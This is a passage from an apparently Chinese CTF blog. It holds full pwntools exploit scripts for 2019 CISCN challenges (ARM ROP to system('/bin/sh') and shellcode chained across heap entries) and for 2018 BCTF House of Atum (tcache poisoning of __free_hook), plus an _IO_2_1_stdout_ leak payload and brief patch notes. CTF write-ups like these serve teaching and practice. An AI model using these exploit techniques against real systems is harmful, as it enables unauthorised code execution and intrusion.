class="string">&#x27;your name:\n\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x24</span></span><br><span class="line">payload += p32(<span class="number">0x103a4</span>) <span class="comment"># 0x000103a4: pop &#123;r3, pc&#125;;</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0x10638</span>) <span class="comment"># 0x00010638: pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;;</span></span><br><span class="line">payload += <span class="number">3</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += <span class="number">3</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x00010628</span>) <span class="comment"># 0x00010628: mov r0, r7; blx r3;</span></span><br><span class="line">payload += <span class="number">7</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x010590</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u32(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>).ljust(<span class="number">0x4</span>,<span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&#x27;system:&#x27;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">binsh = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&#x27;binsh:&#x27;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">0x24</span></span><br><span class="line">payload += p32(<span class="number">0x103a4</span>) <span class="comment"># 0x000103a4: pop &#123;r3, pc&#125;;</span></span><br><span class="line">payload += p32(system)</span><br><span class="line">payload += p32(<span class="number">0x10638</span>) <span class="comment"># 0x00010638: pop &#123;r4, r5, r6, r7, r8, sb, sl, pc&#125;;</span></span><br><span class="line">payload += <span class="number">3</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(binsh)</span><br><span class="line">payload += <span class="number">3</span>*p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">0x00010628</span>) <span class="comment"># 0x00010628: mov r0, r7; blx r3;</span></span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>PATCH: 修改<code>read</code>读入的长度防止栈溢出</p>
<h3 id="pwn9-moneygame-✅"><a href="#pwn9-moneygame-✅" class="headerlink" title="pwn9-moneygame ✅"></a>pwn9-moneygame ✅</h3><p>checksec 发现有rwx的段，通过<code>jmp &quot;\xeb\x04&quot;</code> 在堆空间中构造shellcode并执行即可。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">charge</span>(<span class="params">money</span>):</span><br><span class="line">    ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;Money makes you stronger:\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(money))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">name</span>):</span><br><span class="line">        ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">        sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">        ru(<span class="string">&#x27;input WeaponName:&#x27;</span>)</span><br><span class="line">        se(name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">wid,name</span>):</span><br><span class="line">            ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">            sel(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">            ru(<span class="string">&#x27;change Weapon id:&#x27;</span>)</span><br><span class="line">            sel(<span class="built_in">str</span>(wid))</span><br><span class="line">            ru(<span class="string">&#x27;new Name:&#x27;</span>)</span><br><span class="line">            se(name)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">wid</span>):</span><br><span class="line">                ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">                sel(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">                ru(<span class="string">&#x27;Which Weapon do you want to show?\n&#x27;</span>)</span><br><span class="line">                sel(<span class="built_in">str</span>(wid))</span><br><span class="line"></span><br><span class="line">                <span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">                    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">                        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                        log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">                        gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">                            charge(-<span class="number">500</span>)</span><br><span class="line">                            edit(<span class="number">20</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">                            show(-<span class="number">1</span>)</span><br><span class="line">                            ru(<span class="string">&#x27;Weapon name is:&#x27;</span>)</span><br><span class="line">                            proc = u64(rud(<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x203DB8</span></span><br><span class="line">                            log.info(<span class="string">&#x27;proc:&#x27;</span>+<span class="built_in">hex</span>(proc))</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># shellcode = asm(shellcraft.linux.sh())</span></span><br><span class="line">                            <span class="comment"># print len(asm(&quot;movabs rax, 0x68732f6e69622f&quot;))</span></span><br><span class="line"></span><br><span class="line">                            payload = asm(<span class="string">&quot;add rax,0xf0&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">0</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;mov rax, [rax]&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">1</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;push rax&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">2</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;push 0x3b&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">3</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;pop rax&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">4</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;push 0x0&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">5</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;pop rsi&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">6</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;push 0x0&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">7</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;pop rdx&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">8</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;mov rdi,rsp&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">9</span>,payload)</span><br><span class="line">                            payload = asm(<span class="string">&quot;syscall&quot;</span>).ljust(<span class="number">0x6</span>,<span class="string">&#x27;\x90&#x27;</span>)+<span class="string">&quot;\xeb\x04&quot;</span></span><br><span class="line">                            edit(<span class="number">10</span>,payload)</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># z([&#x27;b *&#x27;+hex(proc_base+0x12D0)])</span></span><br><span class="line">                            edit(-<span class="number">1</span>,p64(proc+<span class="number">0x204088</span>))</span><br><span class="line"></span><br><span class="line">                            ru(<span class="string">&quot;Your choice:\n&quot;</span>)</span><br><span class="line">                            sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">                            io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                                context.binary = <span class="string">&#x27;./moneygame&#x27;</span></span><br><span class="line">                                context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;115&#x27;</span>]</span><br><span class="line">                                context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">                                elf = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">                                    io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">                                    libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                    exploit(<span class="number">0</span>)</span><br><span class="line">                                <span class="keyword">else</span>:</span><br><span class="line">                                    io = process(<span class="string">&#x27;./moneygame&#x27;</span>)</span><br><span class="line">                                    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                    <span class="comment"># print io.libs()</span></span><br><span class="line">                                    proc_base = io.libs()[<span class="string">&#x27;/ctf/work/CTFPro/2019/ciscn2019-area/PWN/moneygame&#x27;</span>]</span><br><span class="line">                                    log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">                                    libc_base= io.libs()[<span class="string">&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>]</span><br><span class="line">                                    log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">                                    exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>patch: 修改函数0xF50，防止输入负数造成越界写</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2019/07/10/ciscn2019%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E5%8C%BA%E5%9F%9F%E8%B5%9B/" data-id="cuidDvD-uvvivMd5qybX2lKAz" data-title="2019 CISCN 华中区域赛" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2018bctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/12/17/2018bctf/" class="article-date">
  <time class="dt-published" datetime="2018-12-17T03:07:10.000Z" itemprop="datePublished">2018-12-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/12/17/2018bctf/">2018 BCTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="House-of-Atum-×"><a href="#House-of-Atum-×" class="headerlink" title="House of Atum ×"></a>House of Atum ×</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#-*-coding: utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span>: p.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x, drop = <span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">cnt</span>):</span><br><span class="line">  sla(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  sa(<span class="string">&#x27;Input the content:&#x27;</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,cnt</span>):</span><br><span class="line">  sla(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  sla(<span class="string">&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">  sa(<span class="string">&#x27;Input the content:&#x27;</span>,cnt)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx,y</span>):</span><br><span class="line">  sla(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  sla(<span class="string">&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">  sla(<span class="string">&#x27;Clear?(y/n):&#x27;</span>,y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">  sla(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">  sla(<span class="string">&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order = []</span>):</span><br><span class="line">  command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">    command += <span class="built_in">str</span>(item) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    log.info(<span class="string">&#x27;gdb command:\n&#x27;</span> + command)</span><br><span class="line">  gdb.attach(p, command)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hack</span>(<span class="params">r</span>):</span><br><span class="line"></span><br><span class="line">  alloc(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x48</span>) <span class="comment">#idx=0</span></span><br><span class="line">  alloc(<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x48</span>) <span class="comment">#idx=1</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">#leaking heap</span></span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  show(<span class="number">0</span>)</span><br><span class="line">  ru(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">  heap = u64(ru(<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x260</span></span><br><span class="line">  log.info(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  dele(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  alloc(p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0x61</span>)+p64(heap+<span class="number">0x68</span>))</span><br><span class="line">  alloc(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">  dele(<span class="number">1</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">#leaking libc</span></span><br><span class="line">  alloc(p64(<span class="number">0</span>))</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  edit(<span class="number">1</span>,p64(heap+<span class="number">0xa0</span>))</span><br><span class="line">  alloc(p64(<span class="number">0</span>))</span><br><span class="line">  edit(<span class="number">1</span>,p64(<span class="number">0</span>)*<span class="number">6</span>+p64(<span class="number">0x1c1</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">0</span>,<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">  dele(<span class="number">0</span>,<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">  edit(<span class="number">1</span>,<span class="string">&#x27;1&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">  show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">  ru(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">  <span class="comment"># z([&#x27;b *&#x27;+hex(proc+0xD0E)])</span></span><br><span class="line">  ru(<span class="string">&#x27;1&#x27;</span>*<span class="number">0x38</span>)</span><br><span class="line">  libc.address = u64(ru(<span class="string">&#x27;\n&#x27;</span>).ljust(<span class="number">0x8</span>, <span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3ebca0</span></span><br><span class="line">  log.info(<span class="string">&quot;libc.address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">  __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">  log.info(<span class="string">&quot;__free_hook:&quot;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line">  system = libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">  log.info(<span class="string">&quot;system:&quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">  edit(<span class="number">1</span>,p64(__free_hook).ljust(<span class="number">0x48</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">  alloc(p64(system))</span><br><span class="line">  edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">  sla(<span class="string">&#x27;Your choice:&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  sla(<span class="string">&#x27;Input the idx:&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">  p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  context.binary = <span class="string">&#x27;./houseofAtum&#x27;</span></span><br><span class="line">  context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;sp&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">  context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">  elf = ELF(<span class="string">&#x27;./houseofAtum&#x27;</span>)</span><br><span class="line">  <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    p = process(<span class="string">&#x27;./houseofAtum&#x27;</span>, env = &#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.27.so&#x27;</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line">    hack(<span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&#x27;./houseofAtum&#x27;</span>],env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&quot;./libc-2.27.so&quot;</span>&#125;)</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">    hack(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>


<h2 id="Three"><a href="#Three" class="headerlink" title="Three"></a>Three</h2><p><code>_IO_2_1_stdout_</code>的payload</p>
<p>这个leak的Payload非常管用</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p64(<span class="number">0xfbad3c80</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p8(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2018/12/17/2018bctf/" data-id="cuid96LGBsAL7JEeoXoP5LjTy" data-title="2018 BCTF" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-qwb2018-re" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/11/16/qwb2018-re/" class="article-date">
  <time class="dt-published" datetime="2018-11-16T02:48:56.000Z" itemprop="datePublished">2018-11-16</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/11/16/qwb2018-re/">qwb2018-re</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h2 id="picture-lock"><a href="#picture-lock" class="headerlink" title="picture_lock"></a>picture_lock</h2><p>这是一个<strong>图片加密锁应用</strong>，主要功能是：</p>
<ol>
<li>选择手机中的图片文件</li>
<li>使用Native代码（C&#x2F;C++）对图片进行加密</li>
